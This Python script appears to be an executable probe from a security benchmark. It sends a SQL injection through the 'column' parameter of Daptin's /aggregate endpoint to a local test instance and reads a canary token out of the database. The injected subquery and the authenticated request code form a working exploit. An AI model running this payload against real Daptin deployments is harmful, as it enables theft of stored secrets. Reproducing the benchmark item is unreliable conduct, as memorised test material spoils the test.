#!/usr/bin/env python3
"""Method-side executable probe: run the aggregate-column SQLi against live Daptin.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
from __future__ import annotations

import json
import os
import sys
import urllib.parse

CASE_SCRIPTS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts")
sys.path.insert(0, CASE_SCRIPTS)
import daptin_api  # noqa: E402

BASE = {
    "v0": "http://127.0.0.1:39082",
    "v1": "http://127.0.0.1:39114",
}


def _base_for(version: str) -> str:
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    pt = os.environ.get("PCB_TARGET_PORT")
    if pt:
        return f"http://127.0.0.1:{int(pt)}"
    return BASE.get(version, BASE["v1"])


def run_probe(candidate, *, version="v1"):
    base = _base_for(version)
    entity = "world"
    column = "(SELECT token FROM pcb_canary ORDER BY id DESC LIMIT 1) as exfil"
    if isinstance(candidate, dict):
        entity = candidate.get("entity") or entity
        params = candidate.get("params") or {}
        if isinstance(params, dict) and params.get("column"):
            column = params["column"]
    token = daptin_api.attacker_token(base)
    if not token:
        return {"ok": False, "status": 0, "body": "login failed", "version": version}
    url = f"{base}/aggregate/{entity}?column={urllib.parse.quote(column)}"
    code, text = daptin_api._request(
        "GET", url, headers={"Authorization": f"Bearer {token}"}, timeout=30,
    )
    return {
        "ok": code == 200,
        "status": code,
        "body": text,
        "version": version,
        "probe_id": (candidate or {}).get("probe_id") if isinstance(candidate, dict) else None,
    }


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1])) if len(sys.argv) > 1 else {}
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
